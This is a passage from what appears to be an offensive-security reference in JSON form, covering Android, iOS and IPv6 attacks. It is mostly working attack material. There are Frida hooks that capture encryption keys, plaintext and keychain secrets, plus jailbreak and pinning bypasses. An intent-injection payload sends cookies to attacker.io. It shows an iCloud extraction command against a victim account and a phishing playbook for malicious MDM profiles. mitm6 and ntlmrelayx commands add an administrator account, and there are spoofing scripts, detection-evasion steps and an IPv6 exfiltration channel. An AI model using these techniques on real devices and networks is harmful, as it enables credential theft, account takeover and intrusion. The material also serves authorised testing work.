software-backed: potentially extractable\n\n# Network security config (check for cleartext traffic allowance)\ncat decompiled/res/xml/network_security_config.xml\n```\n\n---\n\n### Common Android Vulnerabilities\n\n| Vulnerability | Check Method |\n|--------------|-------------|\n| Exported components (no permission) | AndroidManifest.xml + drozer |\n| Insecure data storage | /data/data/, logcat, SD card |\n| Cleartext traffic | Network security config, Burp proxy |\n| Weak cryptography | Code review (ECB mode, MD5, static IV) |\n| Intent injection | Exported activities/receivers |\n| JavaScript injection (WebView) | addJavascriptInterface + loadUrl |\n| Path traversal (ContentProvider) | drozer scanner.provider.traversal |\n| Backup enabled | android:allowBackup=true in manifest |\n\n## ◈ ADVANCED\n\n### Frida-Based Runtime Manipulation\n\nBeyond SSL bypass and root detection, Frida enables deep runtime manipulation:\n\n```javascript\n// Hook cryptographic operations to capture plaintext\nJava.perform(function() {\n // Hook AES encryption — capture key and plaintext before encryption\n var Cipher = Java.use('javax.crypto.Cipher');\n Cipher.init.overload('int', 'java.security.Key').implementation = function(mode, key) {\n if (mode === 1) { // ENCRYPT_MODE\n var keyBytes = key.getEncoded();\n console.log('[*] AES Key: ' + bytesToHex(keyBytes));\n }\n return this.init.call(this, mode, key);\n };\n\n Cipher.doFinal.overload('[B').implementation = function(input) {\n console.log('[*] Plaintext: ' + Java.array('byte', input));\n var result = this.doFinal.call(this, input);\n return result;\n };\n});\n\n// Hook SharedPreferences writes — captures all key/value data stored\nJava.perform(function() {\n var SharedPreferencesEditor = Java.use('android.app.SharedPreferencesImpl$EditorImpl');\n SharedPreferencesEditor.putString.implementation = function(key, value) {\n console.log('[SharedPrefs] ' + key + ' = ' + value);\n return this.putString.call(this, key, value);\n };\n});\n```\n\n### Deep Link / Intent Injection Attacks\n\nExported activities accepting deep links are a common vulnerability surface:\n\n```bash\n# Enumerate deep link handlers\ngrep -r \"intent-filter\" decompiled/AndroidManifest.xml\n# Look for: action MAIN, DATA with scheme\n\n# Test deep link injection\nadb shell am start -W -a android.intent.action.VIEW \\\n -d \"app://target.com/reset?token=injected_value\" \\\n com.target.app\n\n# Intent injection via exported activity\nadb shell am start -n com.target.app/.WebViewActivity \\\n --es url \"javascript:document.location='http://attacker.io/'+document.cookie\"\n\n# Broadcast injection (exported receiver)\nadb shell am broadcast -a com.target.action.RESET_PASSWORD \\\n --es email \"victim@target.com\" \\\n com.target.app\n```\n\n### Android MDM Bypass\n\nBypassing MDM restrictions (for authorized assessments):\n\n```\nMDM enforcement mechanisms:\n1. Device Policy Controller (DPC) app — administers restrictions\n2. Work profile (Android for Work) — isolates work apps\n\nAttack surfaces:\n- DPC vulnerabilities: if DPC app has exported components or weak validation\n- Profile removal: if device allows profile removal without factory reset\n- Staging bypass: provision device before MDM enrollment to prevent DEP\n```\n\nFrida bypass for specific MDM restrictions:\n```javascript\n// Bypass copy-paste restrictions (some MDM policies)\nJava.perform(function() {\n var ClipboardManager = Java.use('android.content.ClipboardManager');\n ClipboardManager.setPrimaryClip.implementation = function(clip) {\n // Override: allow all clipboard operations\n return this.setPrimaryClip.call(this, clip);\n };\n});\n```\n\n### Automated APK Analysis Pipeline\n\n```bash\n# Full automated analysis with output report:\n# 1. Decompile\njadx -d output/ target.apk 2>/dev/null\n\n# 2. Secret hunting (common patterns)\ngrep -rE \"(api_key|apikey|secret|password|token|AWS_|PRIVATE_KEY)\\s*[=:]\\s*['\\\"][^'\\\"]{8,}\" \\\n output/ --include=\"*.java\" | grep -v \"R.java\"\n\n# 3. Exported component enumeration\npython3 - <<'EOF'\nimport xml.etree.ElementTree as ET\ntree = ET.parse('output/resources/AndroidManifest.xml')\nroot = tree.getroot()\nns = {'a': 'http://schemas.android.com/apk/res/android'}\nfor comp in root.iter():\n if comp.get('{http://schemas.android.com/apk/res/android}exported') == 'true':\n print(f\"EXPORTED: {comp.tag} - {comp.get('{http://schemas.android.com/apk/res/android}name')}\")\nEOF\n\n# 4. Network endpoint extraction\ngrep -rE \"https?://[a-zA-Z0-9./_-]+\" output/ --include=\"*.java\" | \\\n grep -v \"schemas.android.com\\|example.com\" | \\\n sed 's/.*\"\\(https\\?:\\/\\/[^\"]*\\)\".*/\\1/' | sort -u\n```", "last_updated": "2026-03-18"}, "ios-security": {"slug": "ios-security", "title": "iOS Security Testing", "category": "Mobile", "content": "# iOS Security Testing\n\n## ◈ BEGINNER\n\n### What Is iOS Security Testing?\n\n**iOS security testing** assesses the security of iOS applications and Apple's mobile platform. iOS is widely considered the most secure mainstream mobile platform — Apple's closed ecosystem, mandatory code signing, hardware security processors, and App Store review create multiple layers of defense. But iOS apps still have attack surfaces: insecure data storage, weak SSL pinning, logic flaws, and phishing-based attacks.\n\n**Key terms:**\n- **Jailbreak** — removing Apple's code signing enforcement to allow arbitrary apps and tools to run; required for most dynamic analysis; the iOS equivalent of rooting Android\n- **Secure Enclave** — a dedicated security processor in all A-series chips; handles Touch ID/Face ID, encryption keys, and secure boot; cannot be directly accessed even with jailbreak\n- **Data Protection** — iOS's file encryption system with four protection classes tied to device lock state; NSFileProtectionComplete means files are encrypted when device is locked\n- **Keychain** — iOS's secure credential storage; ACL-controlled; survives app reinstall; accessible to apps with matching bundle ID / keychain group\n- **SSL pinning** — app validates the server's specific certificate; blocks Burp proxy interception; bypassed with Frida/SSL Kill Switch\n- **palera1n / checkra1n** — popular jailbreak tools; palera1n for A8–A11 chips on modern iOS; bootrom-based jailbreaks are persistent across reboots\n- **Frida** — dynamic instrumentation framework; same tool used for Android; hooks Objective-C/Swift methods and C functions at runtime\n- **objection** — Frida-powered exploration toolkit; automates keychain dumping, SSL bypass, method hooking on iOS\n- **IPA** — iOS App Store Package; the iOS app distribution format; like APK for Android; contains Mach-O binary + resources\n- **frida-ios-dump** — tool to dump a decrypted IPA from a running app's memory (bypasses App Store binary encryption)\n- **class-dump** — extracts Objective-C class headers from compiled iOS binaries; reveals all method signatures and properties\n- **MDM (Mobile Device Management)** — enterprise system for managing iOS devices; can install CA certs (enabling MITM), push apps, and enforce restrictions; malicious profile = full traffic inspection\n\n**The iOS testing workflow:**\n```\n1. Install app (App Store or enterprise distribution)\n2. Proxy traffic (Burp + iOS proxy settings + install Burp CA cert)\n3. If SSL pinning: deploy Frida SSL bypass or SSL Kill Switch\n4. Static analysis: obtain IPA → frida-ios-dump → class-dump + strings\n5. Dynamic analysis: objection → keychain dump, method hooks\n6. Data storage: check NSUserDefaults, SQLite, plist files, keychain\n7. Logic testing: test authentication flows, access controls, deep links\n```\n\n**Analogy:** Testing iOS security is like assessing a high-security vault. The outer shell (code signing, Secure Enclave, sandboxing) is extremely hardened — but the vault contents (app logic, stored data, SSL implementation) can still be weak. A jailbreak is like getting the master key to the outer shell; once inside, you test the actual application security.\n\n## ◈ INTERMEDIATE\n\niOS's closed ecosystem, code signing enforcement, and hardware security features make it one of the most secure mobile platforms. Testing requires jailbreaking or supervised MDM access for most dynamic analysis.\n\n### iOS Security Model\n\n```\nSecurity layers:\n1. Secure Enclave — dedicated security processor (keys, Touch/Face ID)\n2. Code Signing — all executables must be signed by Apple/enterprise cert\n3. Sandboxing — apps isolated via MAC (TrustedBSD)\n4. Data Protection — per-file encryption classes tied to lock state\n5. Keychain — encrypted credential storage (ACL-controlled)\n6. ASLR + PIE — all processes randomized\n7. Pointer Authentication (PAC) — A12+ chips\n8. Memory Tagging (MTE) — A17+ chips\n```\n\n---\n\n### Jailbreaking\n\nJailbreaking removes code signing enforcement and installs Cydia/Sileo package manager:\n\n| Tool | iOS Version | Chip | Type |\n|------|------------|------|------|\n| checkra1n | iOS 12–14.8.1 | A5–A11 | Semi-tethered, bootrom |\n| palera1n | iOS 15–17.x | A8–A11 | Semi-tethered, bootrom |\n| Dopamine | iOS 15–16.6.1 | A12+ | Semi-untethered, kernel |\n| Fugu15 Max | iOS 15.x | A12+ | Semi-untethered |\n| unc0ver | iOS 11–14.8 | A12+ | Semi-untethered |\n\n```bash\n# palera1n (Linux/macOS)\ngit clone https://github.com/palera1n/palera1n\ncd palera1n && ./palera1n -c -v # rootful jailbreak\n\n# checkra1n (macOS/Linux)\n# GUI app: drag to Applications, open, follow steps\n# CLI: checkra1n -c (channel mode) or checkra1n --cli\n\n# After jailbreak: install OpenSSH\n# Cydia → OpenSSH → Install\n\n# SSH into device\nssh root@ # default password: alpine (change immediately!)\n```\n\n---\n\n### Frida on iOS\n\n```bash\n# Install Frida via Cydia/Sileo:\n# Add repo: https://build.frida.re → install Frida\n\n# From PC:\nfrida-ps -U # list processes\nfrida -U -n \"TargetApp\" -l script.js\n\n# SSL Kill Switch 2 (Cydia tweak alternative to Frida SSL bypass)\n# Repo: julioverne.github.io → install SSL Kill Switch 2\n# Kills: NSURLSession, NSURLConnection, AFNetworking, Alamofire pinning\n\n# Frida SSL bypass for iOS\n# script.js:\n# (use SSL-Kill-Switch-Frida or custom implementation)\n```\n\n```javascript\n// iOS SSL pinning bypass (Frida)\nvar SecurityFramework = Module.load('/System/Library/Frameworks/Security.framework/Security');\nvar SSLSetSessionOption = new NativeFunction(\n SecurityFramework.getExportByName('SSLSetSessionOption'), 'int', ['pointer', 'int', 'bool']\n);\n\n// Hook SecTrustEvaluate\nInterceptor.replace(Module.findExportByName('Security', 'SecTrustEvaluate'),\n new NativeCallback(function(trust, result) {\n // Set result to kSecTrustResultProceed\n Memory.writeU32(result, 1);\n return 0; // errSecSuccess\n }, 'int', ['pointer', 'pointer'])\n);\n\n// Or use ssl-kill-switch approach\nInterceptor.replace(Module.findExportByName('Security', 'SecTrustEvaluateWithError'),\n new NativeCallback(function(trust, error) {\n return 1; // true = trusted\n }, 'bool', ['pointer', 'pointer'])\n);\n```\n\n---\n\n### objection on iOS\n\n```bash\n# Start objection (no jailbreak needed with re-signed IPA)\nobjection --gadget \"TargetApp\" explore\n\n# Common commands:\nios sslpinning disable\nios jailbreak disable\nios keychain dump\nios cookies get\nios nsuserdefaults get\nios hooking list classes\nios hooking watch method \"-[LoginViewController loginWithUser:password:]\" --dump-args\nios pasteboard monitor\nios memory list modules\nios bundles list_frameworks\n```\n\n---\n\n### IPA Analysis\n\n```bash\n# Obtain IPA:\n# 1. From iTunes backup (older method)\n# 2. iMazing (decrypt IPA from device)\n# 3. frida-ios-dump (dump decrypted binary from memory)\n\n# frida-ios-dump\ngit clone https://github.com/AloneMonkey/frida-ios-dump\npip install -r requirements.txt\n# Edit dump.py: set device IP/password\npython3 dump.py \"TargetApp\"\n# Output: TargetApp.ipa (decrypted)\n\n# Unzip IPA\nunzip TargetApp.ipa -d TargetApp/\n# Binary at: Payload/TargetApp.app/TargetApp\n\n# Class dump (Objective-C headers)\nclass-dump -H TargetApp.app/TargetApp -o headers/\n# Shows: class names, method signatures, properties\n\n# Swift symbol extraction\nnm TargetApp.app/TargetApp | grep -v \"^U \" | c++filt\n\n# Strings\nstrings TargetApp.app/TargetApp | grep -i \"api\\|key\\|secret\\|token\\|http\"\n\n# Binary protections\notool -l TargetApp.app/TargetApp | grep -E \"PIE|stack_chk|ASLR\"\nrabin2 -I TargetApp.app/TargetApp # with Radare2\n\n# Disassemble with Hopper / Ghidra / IDA\n# Ghidra: File → Import → select binary → Analyze\n```\n\n---\n\n### Keychain Dumping\n\n```bash\n# On jailbroken device:\n# Keychain-Dumper (classic tool)\nssh root@device\nchmod +x keychain_dumper\n./keychain_dumper # dumps all accessible keychain items\n\n# objection keychain dump (easier)\nobjection --gadget \"TargetApp\" explore\nios keychain dump\n# Output: service, account, data (plaintext)\n\n# Common keychain items:\n# - OAuth tokens (long-lived)\n# - API keys\n# - Passwords (if stored via SecItem API)\n# - Certificates / private keys\n```\n\n---\n\n### Traffic Interception with Burp Suite\n\n#### Without Jailbreak (via Profile)\n\n```bash\n# Step 1: Set Burp proxy on device WiFi settings\n# Proxy: burp_ip:8080\n\n# Step 2: Install Burp CA certificate\n# Burp → Proxy → Options → Export CA Certificate → DER format\n# Send to device → Settings → Profile Downloaded → Install → Trust\n\n# Step 3: iOS 10.3+: Settings → General → About → Certificate Trust Settings\n# Toggle Burp CA to TRUSTED\n\n# Step 4: Capture HTTP traffic — HTTPS intercepted if no pinning\n# For pinned apps: use Frida SSL bypass + Burp proxy\n```\n\n#### With Jailbreak + SSL Kill Switch\n\n```bash\n# Install SSL Kill Switch 2 (Cydia)\n# Install Burp cert as above\n# Enable SSL Kill Switch: Settings → SSL Kill Switch → toggle ON\n# All apps now bypass SSL pinning → Burp intercepts everything\n```\n\n---\n\n### iOS Vulnerability Classes\n\n#### Configuration Profile Abuse\n\nMDM configuration profiles can:\n- Install CA certificates (MITM traffic)\n- Restrict device features (enterprise control)\n- Install apps silently\n- Configure VPN (redirect all traffic)\n\n```bash\n# Malicious profile delivery:\n# 1. Host .mobileconfig file on attacker server\n# 2. Send link via phishing (Safari prompts to install)\n# 3. If target installs: CA cert trusted, VPN configured\n# Example: \"Corporate WiFi Settings\" profile → installs attacker CA\n```\n\n#### Enterprise Certificate Abuse\n\n```bash\n# Apple Enterprise Developer Program ($299/year)\n# Issue certificates for in-house app distribution\n# Abuse: distribute malware signed with enterprise cert\n# Target: high-value targets who will trust \"enterprise\" prompt\n\n# AltStore / Sideloady: sideload unsigned apps via Apple ID\n# (limited: 7-day re-signing without paid account)\n```\n\n#### iCloud Exploitation\n\n```bash\n# iCloud account compromise:\n# 1. Phishing for Apple ID credentials\n# 2. If MFA bypassed (SIM swap, Evilginx): full iCloud access\n\n# iCloud data accessible after account compromise:\n# - iCloud Backup (complete device backup)\n# - iCloud Photos\n# - iCloud Drive files\n# - iCloud Keychain (with device trust)\n# - Messages (iCloud Messages sync)\n# - Health data, Location history\n\n# Tools for iCloud forensics (authorized):\n# iMazing, PhoneView, Elcomsoft Phone Breaker\nelcomsoft_phone_breaker --apple-id victim@icloud.com --password P@ss \\\n --backup-password \"device_backup_pass\" --output /tmp/icloud_data\n```\n\n---\n\n### MDM Assessment\n\n```bash\n# Enroll in MDM to understand controls (authorized testing)\n# MDM protocols: OTA enrollment via .mobileconfig\n\n# Check MDM restrictions on enrolled device:\n# Settings → General → Device Management → [MDM Profile]\n# View: restrictions, configuration, certificates, VPN\n\n# MDM bypass: factory reset removes MDM (except DEP/ABM enrollment)\n# Supervised devices: MDM can track location even after wipe\n\n# MDM security testing:\n# 1. Intercept MDM protocol (SCEP, OTA) with Burp\n# 2. Check if device token reuse possible\n# 3. Test unenrollment protections\n# 4. Assess data wipe granularity\n```\n\n---\n\n### LLDB / Cycript Runtime Analysis\n\n```bash\n# LLDB on jailbroken device with debugserver\ndebugserver *:1234 -a \"TargetApp\" # on device\nlldb → process connect connect://device-ip:1234\n\n# Useful LLDB commands:\n# (lldb) po [[NSUserDefaults standardUserDefaults] dictionaryRepresentation]\n# (lldb) po [NSKeyedArchiver archivedDataWithRootObject:[SomeClass sharedInstance]]\n# (lldb) memory read --format x 0x100012345\n\n# Cycript (Objective-C runtime injection — older iOS):\ncycript -p TargetApp\ncy# [UIApp keyWindow].subviews\ncy# var app = [UIApplication sharedApplication].delegate\ncy# [app description]\n```\n\n## ◈ ADVANCED\n\n### Jailbreak Detection Bypass at Scale\n\nEnterprise apps with advanced jailbreak detection use multiple detection vectors:\n\n```javascript\n// Frida-based comprehensive jailbreak bypass\nObjC.schedule(ObjC.mainQueue, function() {\n // Hook file existence checks (common jailbreak detection method)\n Interceptor.attach(Module.findExportByName('libSystem.B.dylib', 'access'), {\n onEnter: function(args) {\n var path = args[0].readUtf8String();\n var jailbreakPaths = ['/Applications/Cydia.app', '/usr/sbin/sshd',\n '/bin/bash', '/etc/apt', '/var/lib/dpkg'];\n if (jailbreakPaths.some(p => path.includes(p))) {\n args[0] = Memory.allocUtf8String('/nonexistent');\n }\n }\n });\n\n // Hook fork() — jailbroken indicator for apps testing process spawning\n Interceptor.attach(Module.findExportByName('libSystem.B.dylib', 'fork'), {\n onLeave: function(retval) {\n retval.replace(-1); // return failure — \"not jailbroken\"\n }\n });\n\n // Bypass sandbox check\n var NSFileManager = ObjC.classes.NSFileManager;\n NSFileManager['- fileExistsAtPath:'].implementation = ObjC.implement(\n NSFileManager['- fileExistsAtPath:'], function(self, sel, path) {\n if (path.toString().match(/\\/Applications\\/Cydia|\\/usr\\/bin\\/ssh/)) {\n return 0;\n }\n return this.fileExistsAtPath_(path);\n }\n );\n});\n```\n\n### Binary Analysis Without Jailbreak\n\nAnalyze iOS apps using only static methods when jailbreaking is not viable:\n\n```bash\n# 1. Obtain IPA without jailbreak:\n# Method: iMazing (macOS app) — exports IPA from connected non-JB device\n# Method: Apple Configurator 2 → download IPA\n# Note: IPA obtained this way is encrypted by FairPlay DRM\n# Frida-ios-dump (requires JB) is needed for decrypted binary\n\n# 2. Decrypt alternative: checkra1n on spare A11 device\n# Use old iPhone 8/X specifically for security testing\n\n# 3. With decrypted binary — full static analysis:\n# Class dump for Objective-C\nclass-dump -S -s -H TargetApp -o headers/\n\n# Swift demangling\nxcrun swift-demangle < symbols.txt\n\n# Binary analysis with r2/Ghidra:\nr2 -A TargetApp\n[0x]> afl~login # find login-related functions\n[0x]> pdf @sym._LoginViewController_loginWithEmail_password_ # disassemble\n```\n\n### Malicious MDM Profile Attack\n\nFor red team assessments targeting iOS users:\n\n```\nAttack scenario: phishing → malicious profile installation\n\nProfile capabilities (no jailbreak needed):\n- Install CA certificate → MITM all HTTPS traffic\n- Configure VPN → route all traffic through attacker server\n- Install enterprise app → distribute custom malware\n- Set DNS → redirect queries to attacker resolver\n- Add WiFi profile → auto-connect to evil twin\n\nDelivery:\n- Phishing email/SMS with link to .mobileconfig file\n- Safari prompts \"This website is trying to configure your iPhone\"\n- Target clicks \"Allow\" → profile installed → CA trusted\n- Profile appears in: Settings → General → VPN & Device Management\n\nDefense evasion:\n- Sign profile with paid Apple developer certificate ($99/year)\n- Signed profiles appear more legitimate (no \"Unsigned\" warning)\n- Host on HTTPS with legitimate-looking domain\n```\n\n### Keychain Data Extraction\n\nThe keychain stores the highest-value data on iOS:\n\n```bash\n# Method 1: objection (jailbreak required)\nobjection --gadget \"TargetApp\" explore\nios keychain dump --json > keychain.json\n# Captures: tokens, passwords, certificates, private keys\n\n# Method 2: Frida keychain hook (intercept reads/writes)\n# Hook SecItemCopyMatching to see keychain queries at runtime:\nInterceptor.attach(Module.findExportByName('Security', 'SecItemCopyMatching'), {\n onEnter: function(args) {\n var query = new ObjC.Object(args[0]);\n console.log('[Keychain Query] ' + query.description());\n },\n onLeave: function(retval) {\n if (retval.toInt32() === 0) { // errSecSuccess\n console.log('[Keychain Result] ' + new ObjC.Object(retval).description());\n }\n }\n});\n\n# Method 3: keychain-dumper (jailbreak, classic tool)\nssh root@device\n./keychain_dumper -a # all keychain items\n./keychain_dumper -g # generic passwords only (most sensitive)\n```", "last_updated": "2026-03-18"}, "ipv6-attacks": {"slug": "ipv6-attacks", "title": "IPv6 Attacks", "category": "Network Attacks", "content": "# IPv6 Attacks\n\n## ◈ BEGINNER\n\n### What Are IPv6 Attacks?\n\n**IPv6 attacks** exploit the fact that IPv6 is enabled by default on every modern Windows system — but most organizations have zero IPv6 security controls (no firewall rules, no IDS signatures, no monitoring). This creates a massive blind spot that attackers exploit for MITM and credential capture.\n\n**The critical flaw:** Windows prefers IPv6 over IPv4 by default (per RFC 3484). If an attacker can send a Router Advertisement or DHCPv6 response assigning themselves as the IPv6 DNS server, all Windows hosts in range will prefer to use the attacker's DNS — regardless of IPv4 DNS settings. This enables NTLM capture and relay from the entire network segment.\n\n**Key terms:**\n- **IPv6** — the modern internet protocol; 128-bit addresses (vs IPv4's 32-bit); enabled by default on all modern OS despite many networks not routing it\n- **Link-local address** — auto-assigned IPv6 address (fe80::/10 range); doesn't require DHCP; exists on every IPv6-capable interface automatically\n- **SLAAC (Stateless Address Autoconfiguration)** — IPv6 hosts configure themselves using Router Advertisements; no DHCP required\n- **Router Advertisement (RA)** — ICMPv6 message that configures hosts' default gateway and DNS; forging one lets you set yourself as DNS server for all hosts\n- **DHCPv6** — IPv6 address assignment via a server; mitm6 abuses DHCPv6 to assign attacker as DNS\n- **mitm6** — a tool that sends rogue DHCPv6 responses and Router Advertisements to hijack IPv6 DNS for all Windows hosts in a broadcast domain\n- **NDP (Neighbor Discovery Protocol)** — IPv6's replacement for ARP; uses ICMPv6 messages; NDP spoofing = IPv6 ARP poisoning\n- **WPAD (Web Proxy Auto-Discovery)** — Windows' mechanism for auto-detecting proxy settings; when DNS is hijacked, WPAD queries go to the attacker, triggering NTLM authentication\n- **RA Guard** — a switch-level defense that blocks Router Advertisement frames from non-router ports; mitigates mitm6\n- **DHCPv6 snooping** — switch feature that validates DHCPv6 server messages; prevents rogue DHCPv6\n- **ADIDNS** — Active Directory Integrated DNS; authenticated domain users can add DNS records; abused to create WPAD entries pointing to the attacker\n\n**Why this matters in practice:** Most organizations have disabled LLMNR/NBT-NS (Responder's main vector) — but IPv6 attacks work even in hardened environments where those protocols are disabled. mitm6 + ntlmrelayx is the backup NTLM relay method when Responder fails.\n\n**Analogy:** IPv6 attacks are like exploiting a building's new fire exit that nobody has put a lock on yet. The main entrance (IPv4) has security cameras, badge readers, and guards. The fire exit (IPv6) was just installed, everyone forgot about it, and there's no security at all.\n\n## ◈ INTERMEDIATE\n\nIPv6 is enabled by default on every modern Windows, Linux, and macOS system — but most organizations have no IPv6 security controls (firewall rules, monitoring, IDS signatures). This blind spot enables powerful credential capture and MITM attacks in Active Directory environments.\n\n### IPv6 Fundamentals for Attackers\n\n```\nKey IPv6 concepts:\n- Link-local: fe80::/10 — auto-assigned, no DHCP needed\n- SLAAC: Stateless Address Autoconfiguration — hosts configure themselves via Router Advertisements\n- DHCPv6: Stateful address assignment (like DHCPv4)\n- NDP: Neighbor Discovery Protocol — replaces ARP (ICMPv6 types 133-137)\n- Router Advertisement (RA): type 134 — configures default gateway + DNS for hosts\n- Router Solicitation (RS): type 133 — hosts request RA from routers\n- Neighbor Solicitation (NS): type 135 — replaces ARP request\n- Neighbor Advertisement (NA): type 136 — replaces ARP reply\n\nCritical: Windows prefers IPv6 over IPv4 by default (RFC 3484)\n→ Rogue IPv6 DNS server takes priority over IPv4 DNS\n```\n\n---\n\n### mitm6 — DHCPv6 DNS Takeover\n\nmitm6 sends rogue Router Advertisements and DHCPv6 replies to assign itself as the IPv6 DNS server for all Windows hosts. Windows then uses the attacker's DNS for name resolution — enabling NTLM relay via WPAD or direct credential capture.\n\n```bash\n# Install\npip3 install mitm6\n# or: git clone https://github.com/dirkjanm/mitm6 && pip3 install -r requirements.txt\n\n# Basic attack (targets all hosts in domain)\nsudo mitm6 -d corp.local\n\n# Target specific subnet\nsudo mitm6 -d corp.local -i eth0\n\n# Whitelist specific hosts only\nsudo mitm6 -d corp.local --host-whitelist 192.168.1.0/24\n\n# What mitm6 does:\n# 1. Listens for DHCPv6 solicitations from Windows hosts\n# 2. Assigns link-local IPv6 address to victim\n# 3. Sets attacker as IPv6 DNS server (highest priority)\n# 4. Victims resolve hostnames via attacker's DNS\n# 5. Attacker responds with WPAD or SMB URLs → NTLM relay\n```\n\n---\n\n### mitm6 + ntlmrelayx (AD Credential Capture)\n\nThe most powerful combination — capture NTLMv2 hashes from all hosts that make DNS queries, then relay to LDAP/LDAPS for account creation or shadow credentials:\n\n```bash\n# Terminal 1: Start ntlmrelayx targeting LDAP on DC\nimpacket-ntlmrelayx -6 -t ldaps://192.168.1.10 \\\n --delegate-access \\\n --add-computer EVILPC \\\n -wh attacker-wpad.corp.local \\\n -l /tmp/loot\n\n# Terminal 2: Start mitm6\nsudo mitm6 -d corp.local\n\n# What happens:\n# 1. mitm6 → victims get attacker IPv6 DNS\n# 2. Victims query \"wpad.corp.local\" for proxy config\n# 3. ntlmrelayx serves fake WPAD (requests NTLM auth)\n# 4. Victims authenticate → NTLM relayed to LDAPS on DC\n# 5. With --delegate-access: creates machine account + sets RBCD\n# 6. Attacker can then impersonate any user to victim machine\n\n# Alternative: relay to SMB for command execution\nimpacket-ntlmrelayx -6 -t smb://192.168.1.20 -smb2support -c \"net user hacker P@ss123! /add && net localgroup administrators hacker /add\"\n\n# Relay to LDAP for user enumeration/modification\nimpacket-ntlmrelayx -6 -t ldap://192.168.1.10 -wh attacker-wpad.corp.local --dump-laps\n```\n\n---\n\n### Rogue Router Advertisement (RA) Attack\n\nSend forged RA packets to become the default IPv6 gateway for all hosts:\n\n```bash\n# THC-IPv6 toolkit\nsudo apt install thc-ipv6 -y\n\n# Send rogue RA (become default gateway)\nsudo fake_router6 eth0 fe80::1 # attacker's link-local as gateway\n\n# flood_router6: flood with random RA (DoS — use carefully)\nsudo flood_router6 eth0\n\n# Python with scapy\nfrom scapy.all import *\nfrom scapy.layers.inet6 import *\n\nra = Ether(dst=\"33:33:00:00:00:01\")/IPv6(dst=\"ff02::1\", src=\"fe80::1\")/\\\n ICMPv6ND_RA(M=1, O=1)/\\\n ICMPv6NDOptDNSS(dns=[IPv6Address(\"fe80::1\")])/\\\n ICMPv6NDOptPrefixInfo(prefix=\"2001:db8::\", prefixlen=64)\nsendp(ra, iface=\"eth0\", loop=1, inter=5)\n```\n\n---\n\n### IPv6 Scanning\n\nMost organizations have no IPv6 IDS signatures — scanning is often undetected:\n\n```bash\n# nmap IPv6 scan\nnmap -6 -sV fe80::1/64 --interface eth0 # link-local range\nnmap -6 -sV 2001:db8::/32 # routable range\n\n# alive6 (THC-IPv6) — discover live hosts\nsudo alive6 eth0 # ICMPv6 ping all link-local\nsudo alive6 -p eth0 # passive mode\n\n# scan6 (SI6 Networks)\nsudo scan6 -i eth0 -L -e -v # local network scan\nsudo scan6 -i eth0 -d 2001:db8::/64 -v # specific prefix\n\n# ping6 all-nodes multicast\nping6 -c 3 ff02::1%eth0 # all link-local nodes respond\n\n# NDP cache inspection (post-MITM)\nip -6 neigh show\n```\n\n---\n\n### IPv6 Firewall Bypass\n\nMany perimeter firewalls block IPv4 but have no IPv6 rules:\n\n```bash\n# Check if target has IPv6 connectivity\nping6 targetdomain.com\nnmap -6 -p 80,443,22 targetdomain.com\n\n# Common IPv6 tunneling protocols that bypass IPv4 firewalls:\n# 6in4 (protocol 41): tunnel IPv6 in IPv4 packets\n# Teredo (UDP 3544): NAT traversal for IPv6\n# ISATAP: intrasite automatic tunnel addressing protocol\n# 6to4: auto-tunnel (192.88.99.1 anycast relay)\n\n# If target runs Teredo:\nsudo apt install miredo # Teredo client\n# Enables IPv6 even behind NAT — potential tunnel into restricted networks\n\n# Tunnel C2 traffic over IPv6:\n# Many DLP/proxy solutions only inspect IPv4 traffic\n# IPv6 C2 channel bypasses IPv4-only filtering\n```\n\n---\n\n### NDP Spoofing (IPv6 ARP Equivalent)\n\n```bash\n# parasite6: respond to all NDP neighbor solicitations (= ARP spoofing for IPv6)\nsudo parasite6 eth0\n\n# Targeted NDP spoof with scapy\nfrom scapy.all import *\nfrom scapy.layers.inet6 import *\n\ndef ndp_spoof(target_ip6, spoof_ip6, target_mac, iface):\n pkt = Ether(dst=target_mac)/\\\n IPv6(src=spoof_ip6, dst=target_ip6)/\\\n ICMPv6ND_NA(tgt=spoof_ip6, R=0, S=1, O=1)/\\\n ICMPv6NDOptDstLLAddr(lladdr=get_if_hwaddr(iface))\n sendp(pkt, iface=iface, verbose=0)\n```\n\n---\n\n### ADIDNS Abuse via IPv6\n\nActive Directory Integrated DNS allows authenticated users to add DNS records — abuse to redirect traffic:\n\n```bash\n# Add DNS record pointing to attacker (requires domain user creds)\npython3 dnstool.py -u corp.local\\\\user -p pass \\\n -r wpad.corp.local \\\n -d 192.168.1.50 \\\n --action add \\\n 192.168.1.10 # DC IP\n\n# With IPv6: add AAAA record\npython3 dnstool.py -u corp.local\\\\user -p pass \\\n -r wpad.corp.local \\\n -d fe80::1 \\\n --action add --record-type AAAA \\\n 192.168.1.10\n```\n\n---\n\n### Detection and Defense\n\n| Attack | Detection | Mitigation |\n|--------|-----------|------------|\n| Rogue RA / DHCPv6 | RA Guard on switches, ICMPv6 monitoring | IPv6 RA Guard (Cisco/Juniper) |\n| mitm6 | Sudden IPv6 DNS changes on hosts | DHCPv6 snooping; disable IPv6 if unused |\n| NDP spoofing | MAC→IPv6 mapping changes (like ARP watch) | IPv6 SEND (Secure NDP) |\n| IPv6 scanning | IDS IPv6 signatures (Snort/Suricata) | Enable IPv6 ruleset in IDS |\n| Tunnel bypass | Inspect protocol 41 / UDP 3544 | Block tunneling protocols at perimeter |\n\n## ◈ ADVANCED\n\n### mitm6 Detection Evasion\n\nDefault mitm6 operation is noisy — it sends DHCPv6 to all hosts, triggering potential RA Guard alerts. Targeted operation reduces noise:\n\n```bash\n# Target only specific host (minimizes traffic, reduces detection)\nsudo mitm6 -d corp.local --host-whitelist 192.168.1.100\n\n# Limit to specific interface and slow RA rate\nsudo mitm6 -d corp.local -i eth0 --ignore-nofqdn\n\n# Avoid targeting DCs (unusual DHCPv6 from DC is more likely to alert)\nsudo mitm6 -d corp.local --ignore-prefixes 192.168.1.10/32 # DC IP\n\n# Time the attack: run during business hours when normal DNS queries are high\n# mitm6 traffic blends with legitimate DHCP/DNS patterns during peak hours\n```\n\n### IPv6 as C2 Exfiltration Channel\n\nOrganizations blocking IPv4 egress often overlook IPv6:\n\n```bash\n# Check if target has routable IPv6 connectivity\nping6 ipv6.google.com\n\n# If yes: tunnel C2 over IPv6 (bypasses IPv4-only proxy/DLP)\n# Most corporate proxies are IPv4-only: HTTPS via IPv6 goes direct\n# Tool: ssh -6 user@[ipv6_c2_server]\n\n# DNS over IPv6: query AAAA records on attacker-controlled domain\n# Each query exfiltrates data encoded in subdomain\n# IPv6 DNS queries often have no SoC coverage\n\n# ICMPv6 covert channel:\n# Use ICMPv6 echo request/reply payload for C2 data\n# Many networks pass ICMPv6 without inspection (needed for path 